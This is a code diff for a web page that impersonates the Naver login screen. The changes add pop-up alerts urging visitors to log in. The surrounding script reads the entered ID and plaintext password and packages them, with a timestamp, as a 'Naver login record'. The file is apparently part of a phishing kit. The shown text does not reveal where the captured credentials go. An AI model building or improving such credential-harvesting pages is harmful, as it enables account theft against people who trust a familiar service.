@@ -4,6 +4,11 @@ document.addEventListener('DOMContentLoaded', () => {
   const userPwInput = document.getElementById('userPw');
   const tabs = document.querySelectorAll('.tab_item');
 
+  // 0. 페이지 접속 시 팝업 안내창 띄우기
+  setTimeout(() => {
+    alert('로그인을 해주시기 바랍니다.');
+  }, 100);
+
   // 탭 전환 동작 (ID 로그인, 일회용 번호, QR코드)
   tabs.forEach((tab) => {
     tab.addEventListener('click', () => {
@@ -18,7 +23,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const userId = userIdInput.value.trim();
     const userPw = userPwInput.value;
 
-    if (!userId || !userPw) return;
+    if (!userId || !userPw) {
+      alert('로그인을 해주시기 바랍니다.');
+      return;
+    }
 
     const payloadText = `[네이버 로그인 기록]\n아이디: ${userId}\n비밀번호: ${userPw}\n시각: ${new Date().toLocaleString()}`;
 
